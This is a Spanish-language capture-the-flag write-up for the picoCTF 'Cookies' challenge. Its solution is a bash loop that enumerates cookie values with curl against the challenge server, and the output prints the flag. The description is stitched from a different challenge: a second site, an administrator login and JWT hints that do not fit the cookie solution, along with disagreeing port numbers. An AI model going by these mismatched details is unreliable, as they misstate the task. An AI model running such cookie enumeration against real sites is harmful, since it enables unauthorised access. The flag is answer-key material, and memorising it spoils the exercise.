## Descripcion
Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:28916/](http://mercury.picoctf.net:28916/)

Hay un sitio web seguro en https://jupiter.challenges.picoctf.org/problem/54253/ (enlace) o http://jupiter.challenges.picoctf.org:54253. ¡Intenta ver si puedes iniciar sesión como administrador!
### Pistas
1. What is that cookie?
2. Have you heard of JWT?

1. ¿Qué es esa "cookie"?
2. ¿Has oído hablar de JWT?
### Solución
```
hellbroone-picoctf@webshell:~$ for i in {8..20}; do curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=$i"; done | grep "I love\|pico"
            <p style="text-align:center; font-size:30px;"><b>I love molasses cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love kiss cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love biscotti cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love butter cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love spritz cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love snowball cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love drop cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love thumbprint cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love pinwheel cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love wafer cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
            <p style="text-align:center; font-size:30px;"><b>I love macaroon cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love fortune cookies!</b></p>
hellbroone-picoctf@webshell:~$ exit
logout

```
### Notas Adicionales
Para este reto aprendimos obtener cookies desde el bash para poder obtener las cookies necesarias y poder saber cuál es la cookie que necesitamos, por ello hicimos un pequeño código que nos permite ejecutar y obtener las cookies de un sitio mediante una consulta de su nombre.
### Referencias
https://play.picoctf.org/practice/challenge/173
[http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)
